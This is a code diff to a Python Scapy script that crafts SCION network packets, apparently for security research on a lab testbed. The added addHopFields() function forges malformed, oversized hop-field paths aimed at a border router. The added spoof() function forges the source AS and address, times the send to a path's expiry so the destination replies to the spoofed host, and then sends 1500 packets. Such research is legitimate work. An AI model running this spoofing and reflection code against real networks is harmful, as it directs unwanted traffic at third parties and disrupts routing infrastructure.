@@ -1,13 +1,15 @@
 import socket
 import sys
+import time
 sys.path.append("./scapy-scion-int")
+import datetime
 from typing import List, Optional, Tuple, Union
 import signal
 import json
 import subprocess
 from scapy_scion.layers.scmp import SCMP, EchoRequest
-from scapy_scion.layers.scion import SCION, UDP, SCIONPath
-from scapy.all import bind_layers, sniff, sr1, conf, L3RawSocket, IP, Ether, sr, srp, srp1,  SimpleSocket
+from scapy_scion.layers.scion import SCION, UDP, SCIONPath, HopField, InfoField
+from scapy.all import bind_layers, sniff, sr1, conf, L3RawSocket, IP, Ether, sr, srp, srp1,  SimpleSocket, send
 import pathlib
 import pprint
 # import scapy
@@ -150,7 +152,7 @@ def fetch_paths(dst_IA: str) -> dict:
     return paths
 
 
-def choose_path(dst_IA: str, paths: dict, index: Optional[int] = None, sequence: Optional[str] = None) -> Union[SCION, Tuple[SCION, str]]:
+def choose_path(dst_IA: str, paths: dict, index: Optional[int] = None, sequence: Optional[str] = None, br_addr: Optional[str] = br_addr) -> Union[SCION, Tuple[SCION, str]]:
     """
     Choose a path for sending a SCION packet.
 
@@ -173,7 +175,7 @@ def choose_path(dst_IA: str, paths: dict, index: Optional[int] = None, sequence:
         # No index and no sequence provided
         chosen_path = paths["paths"][0]
         sequence = chosen_path["sequence"]
-    print("Chosen path = ", sequence)
+    # print("Chosen path = ", sequence)
 
     dstAddr = "127.0.0.1" # anything, not important as we just capture the created SCION packet with the path
     path, _ = capture_path(scion="scion", src_br=f"{br_addr}:{br_port}",
@@ -293,6 +295,91 @@ def emptyInfo():
     
     resp = sr1(p, iface=br_iface, timeout=1)
     resp.show()
+    # resp.pdfdump("output/received_packet.pdf")
+
+
+def addHopFields(extend_path: bool = True, nr_new_hops: int = 56):
+    """
+    Mess around with info fields and segment lengths in a SCION packet.
+    """
+
+    dstISD = 64
+    dstAS = "2:0:2c"
+    dst_IA = f"{dstISD}-{dstAS}"
+
+    paths = fetch_paths(dst_IA)
+
+    sequence1 = "64-2:0:2b#0,1 64-559#24,21 64-15623#8,16 64-6730#27,8 64-3303#10,21 64-2:0:2c#1,0"
+    sequence2 = "64-2:0:2b#0,1 64-559#24,17 64-3303#1,21 64-2:0:2c#1,0"
+
+    SCION_path1 = choose_path(dst_IA, paths, sequence=sequence1)
+    # SCION_path2 = choose_path(dst_IA, paths, sequence=sequence2)
+
+    dstAddr = "192.168.110.78" # kali in Thun
+    bind_layers(UDP, SCION, dport=br_port)
+    bind_layers(UDP, SCION, sport=br_port)
+    myIP = IP()
+    myIP.src = "192.168.111.25"
+    myIP.dst = br_addr # address of border router (NOT! actual destination address)
+    # myIP.flags = "DF" # Don't fragment (less important?)
+
+    myUDP = UDP()
+    myUDP.sport = 30041
+    myUDP.dport = br_port
+
+    mySCION = SCION_path1
+    mySCION.DstISD = dstISD
+    mySCION.DstAS = dstAS
+    mySCION.SrcISD = 64
+    mySCION.SrcAS = "2:0:2b"
+    mySCION.PathType = 1
+    mySCION.DstHostAddr = dstAddr
+    mySCION.SrcHostAddr = "192.168.111.25"
+    
+    # Seg0Len has 6 bits -> 64 hops
+    # whole path must be max. 64 (<= 64)
+    if extend_path:
+        orig_seg0len = mySCION.Path.Seg0Len
+        new_len = orig_seg0len + nr_new_hops # must be < 64
+        mySCION.Path.Seg0Len = new_len
+        mySCION.Path.CurrHF = nr_new_hops
+        mySCION.Path.HopFields = nr_new_hops * [mySCION.Path.HopFields[0]] + mySCION.Path.HopFields
+    
+    # infofield = mySCION.Path.InfoFields[0]
+    # print("InfoField = ", bytes(infofield))
+    # hopfield = mySCION.Path.HopFields[0]
+    # print("HopField = ", bytes(hopfield))
+
+    # mySCION.show()
+    # SCION_path2.show()
+    # input()
+
+    mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=b"A"*13))
+
+    p = myIP/myUDP/mySCION/mySCMP
+
+    del p[IP].len
+    del p[IP].chksum
+    del p[UDP].len
+    del p[UDP].chksum
+    del p[SCION].NextHdr
+    del p[SCION].HdrLen
+    del p[SCION].PayloadLen
+    # p.show2()
+    # scion_bytes = bytes(p[SCION].Path)
+    # scion_base64 = base64.encodebytes(scion_bytes)
+    # print(scion_bytes)
+    # print(scion_base64)
+    # p.pdfdump("output/sent_packet.pdf")
+    # i = 1
+    # while True:
+    #     print(f"Sending packet {i}")
+    #     i += 1
+    #     resp = sr1(p, iface=br_iface, timeout=1)
+    #     time.sleep(1)
+
+    resp = sr1(p, iface=br_iface, timeout=1)
+    # resp.show()
     # resp.pdfdump("output/received_packet.pdf")
 
 
@@ -461,11 +548,132 @@ def interceptAndModify():
     ss.send(resp)
     s.close()
 
+def spoof():
+    """
+    Sends valid packet with valid (but almost expired) path to the destination.
+    Packet contains spoofed source ISD-AS/address info.
+    With precise timing, the destination will look up path (since it can't revert it anymore, due to expiration) to the spoofed address and will send to it.
+
+    Prerequisites:
+    - run the path_saver.py script to save paths to file (path_seg_thun.json)
+    - let path_saver.py run for at least 6 hours (paths get invalidated after 6 hours)
+    """
+
+
+    dstISD = 64
+    dstAS = "2:0:2c"
+    dst_IA = f"{dstISD}-{dstAS}"
+
+    paths = fetch_paths(dst_IA)
+
+    # seq_ZH_TH = "64-2:0:2b#0,1 64-559#24,15 64-6730#9,8 64-3303#10,21 64-2:0:2c#1,0"
+    # seq_ZH_LA = "64-2:0:2b#0,1 64-559#24,15 64-6730#9,25 64-2:0:2d#1,0"
+    # seq_TH_LA = "64-2:0:2c#0,1 64-3303#21,10 64-6730#8,25 64-2:0:2d#1,0",
+
+    SCION_path = choose_path(dst_IA, paths) # just take one
+
+    all_down_segments = {}
+    with open("path_seg_thun.json", "r") as f:
+        all_down_segments = json.load(f)
+    
+    print("All paths = ", all_down_segments)
+    keys = [datetime.datetime.strptime(k, "%Y-%m-%d %H:%M:%S") for k in all_down_segments.keys()]
+    now = datetime.datetime.now() + datetime.timedelta(seconds=10)
+    bigger_time = sorted([k for k in keys if k + datetime.timedelta(hours=6) > now])
+    if not bigger_time:
+        print("No paths available, run path_saver.py first")
+        return  # no paths available
+    
+    next_time = bigger_time[0]
+    # entry :
+    # "2024-05-28 10:47:43": {
+    #     "HopFields": [
+    #         "003f000000196273782f5942",
+    #         "003f000200003e940457803b"
+    #     ],
+    #     "InfoFields": "01005a7a66559a2f",
+    #     "Timestamp": "2024-05-28 10:47:43"
+    # }
+    entry = all_down_segments[next_time.strftime("%Y-%m-%d %H:%M:%S")]
+    
+    seg2len = len(entry["HopFields"])
+    SCION_path.Path.Seg2Len = seg2len
+    SCION_path.Path.InfoFields[-1] = InfoField(bytes.fromhex(entry["InfoFields"]))
+    my_hopfields = [HopField(bytes.fromhex(hop)) for hop in entry["HopFields"]]
+    SCION_path.Path.InfoFields[-1].show()
+    SCION_path.Path.HopFields[-seg2len:] = my_hopfields
+
+    dstAddr = "192.168.110.78"
+    bind_layers(UDP, SCION, dport=br_port)
+    bind_layers(UDP, SCION, sport=br_port)
+    myIP = IP()
+    myIP.src = "192.168.111.25"
+    myIP.dst = br_addr # address of border router (NOT! actual destination address)
+    # myIP.flags = "DF" # Don't fragment (less important?)
+
+    myUDP = UDP()
+    myUDP.sport = 30041
+    myUDP.dport = br_port
+
+    mySCION = SCION_path
+    mySCION.SrcISD = 64
+    mySCION.SrcAS = "2:0:2d" # spoofed AS
+    mySCION.PathType = 1
+    mySCION.DstHostAddr = dstAddr
+    mySCION.SrcHostAddr = "192.168.112.15" # spoofed address
+
+    mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=b"A"*13))
+
+    p = myIP/myUDP/mySCION
+
+    del p[IP].len
+    del p[IP].chksum
+    del p[UDP].len
+    del p[UDP].chksum
+    del p[SCION].NextHdr
+    del p[SCION].HdrLen
+    del p[SCION].PayloadLen
+    # p.show2()
+    # p.pdfdump("output/sent_packet.pdf")
+    
+    print("Next time = ", next_time, next_time + datetime.timedelta(hours=6))
+    expire_time = next_time + datetime.timedelta(hours=6)
+    delta = datetime.timedelta(milliseconds=500)
+    wait_time = expire_time - datetime.datetime.now() - delta
+    wait_time_sec = wait_time.seconds + wait_time.microseconds / 1000000
+    print(f"Waiting {wait_time} = {wait_time_sec} seconds until path expires")
+    print("Expire time = ", expire_time)
+    i = 1
+    while(wait_time_sec > 3):
+        print("Now = ", datetime.datetime.now(), " waiting for: ", wait_time_sec)
+        mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=i.to_bytes(10, byteorder='big')))
+        i += 1
+        send(p/mySCMP, iface=br_iface, count=1)
+        time.sleep(1)
+        wait_time = expire_time - datetime.datetime.now() - delta
+        wait_time_sec = wait_time.seconds + wait_time.microseconds / 1000000
+    
+    print("i = ", i)
+    mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=i.to_bytes(10, byteorder='big')))
+    p = p/mySCMP
+    print("sleeping for: ", wait_time_sec)
+    time.sleep(wait_time_sec)
+    print("Now = ", datetime.datetime.now())
+    send(p, iface=br_iface, count=1500)
 
 
 
 if __name__ == "__main__":
     # base()
     # emptyInfo()
+    # for i in range(100):
+    #     addHopFields()
+    # for i in range(100):
+    #     addHopFields(extend_path=False)
+    # addHopFields()
+    # while True:
+    #     nr_hops = int(input("Enter number of hops to add: "))
+    #     addHopFields(nr_new_hops=nr_hops)
     # wrongNewPath()
-    interceptAndModify()
+    # interceptAndModify()
+    spoof()
